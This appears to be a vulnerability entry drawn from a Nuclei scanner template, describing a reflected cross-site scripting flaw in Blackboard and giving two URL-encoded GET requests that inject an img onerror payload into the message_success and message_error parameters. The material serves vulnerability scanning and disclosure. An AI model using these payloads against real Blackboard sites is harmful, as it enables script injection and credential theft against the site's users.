# Vulnerability: Blackboard - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`parentlink-xss.yaml`)

## Description
Blackboard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
GET {{BaseURL}}/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
```

